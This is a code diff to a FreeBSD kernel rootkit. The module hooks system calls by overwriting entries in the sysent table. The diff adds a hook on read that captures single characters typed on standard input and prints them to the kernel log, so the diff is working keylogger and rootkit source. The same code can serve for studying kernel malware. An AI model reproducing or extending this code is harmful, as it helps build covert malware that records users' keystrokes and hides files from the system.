@@ -1,5 +1,7 @@
 #include "rootkit.h"
 
+
+
 /*
 SYSCALLS TO HOOK:
 chdir
@@ -46,6 +48,7 @@ int insert_hooks(void) {
 	sysent[SYS_getdirentries].sy_call = (sy_call_t *)hook_sys_getdirentries;
 	sysent[SYS_open].sy_call = (sy_call_t *)hook_sys_open;
 	sysent[SYS_openat].sy_call = (sy_call_t *)hook_sys_openat;
+	sysent[SYS_read].sy_call = (sy_call_t *)hook_sys_read;
 	return 0;
 }
 
@@ -54,6 +57,7 @@ int remove_hooks(void) {
 	sysent[SYS_getdirentries].sy_call = (sy_call_t *)sys_getdirentries;
 	sysent[SYS_open].sy_call = (sy_call_t *)sys_open;
 	sysent[SYS_openat].sy_call = (sy_call_t *)sys_openat;
+	sysent[SYS_read].sy_call = (sy_call_t *)sys_read;
 	return 0;
 }
 
@@ -172,4 +176,36 @@ int hook_sys_openat(struct thread * td, struct openat_args * uap) {
 		}
 	}
 	return sys_openat(td, uap);
+}
+
+int hook_sys_read(struct thread *td, struct read_args * uap){
+
+		
+
+	int error;
+	char buf[1];
+	int done;
+
+	error = sys_read(td, uap);
+
+	if (error || (!uap->nbyte) || (uap->nbyte > 1) || (uap->fd != 0))
+		return(error);
+
+
+
+	copyinstr(uap->buf, buf, 1, &done);
+
+	
+
+	printf("%c", buf[0]);
+
+
+	
+	
+
+
+	
+
+	return(error);
+
 }
